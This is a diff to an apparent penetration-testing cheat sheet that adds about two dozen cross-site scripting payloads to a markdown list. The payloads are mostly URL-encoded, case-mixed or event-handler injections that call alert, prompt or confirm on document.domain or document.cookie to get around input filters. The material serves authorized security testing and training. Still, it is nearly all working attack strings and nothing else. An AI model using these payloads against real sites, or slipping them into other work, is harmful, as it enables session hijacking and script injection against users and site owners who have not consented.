@@ -45,6 +45,32 @@
 <!--><svg/onload=window.alert();//
 "><img src =" x "oerror = " alert ('RodricBr); ">
 "><script><svg/alert%20(document.cookie)</script>
+%22on%3eerror=%22prompt(document.domain)
+%27%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+%3Cscript%3Ealert(document.domain);%3C/script%3E
+--><font color=blue><h1>xss<img src onerror=alert(`XSS`)>/
+"onmouseover=alert(1)//
+%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E
+'onerror=%22alert%60kauenavarro%60%22testabcd))/
+%3cscript%3eprompt(document.domain)%3c%2fscript%3e
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
+1%27%22%28%29%26%25%3Cacx%3E%3CScRiPt%20%3Ealert%28document.domain%29%3C/ScRiPt%3E
+'"()%26%25<acx><ScRiPt%20>alert(document.domain)</ScRiPt>
+'();}]9676"></script><script>alert(document.domain)</script>
+"%20"><input><img src=x onerror=alert(document.domain)>%3
+%22%3E%3C%2Fa%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28document.cookie%29%3B%3E%3C%2Fscript%3E
+%3Cmarquee%20loop%3d1%20width%3d0%20onfinish%3dco\u006efirm(document.cookie)%3EXSS%3C%2fmarquee%3E
+"><svg+svg+svg\/\/On+OnLoAd=confirm(document.cookie)>
+javascript:alert(document.domain)
+%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3B%3E
+%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28POCkauenavarroxss%29%3E
+;'"/'/><svg/onload=confirm('teste
+'%22()%26%25<acx><ScRiPt%20>alert(1)</ScRiPt>
+<ScRiPt>prompt%289371%29<%2FScRiPt>=<ScRiPt>alert%28document.domain%29<%2FsCrIpT>
+0%0d%0a%0d%0a23%0d%0a<svg%20onload=confirm(document.domain)>%0d%0a0%0d%0a
+%27x%27onclick=%27alert(1)
+onMouseOvER=prompt(/xss/)//
+%27%20onclick=alert(document.domain)%20accesskey=X%20
 ```
 
 ## XSS + SSRF <br>
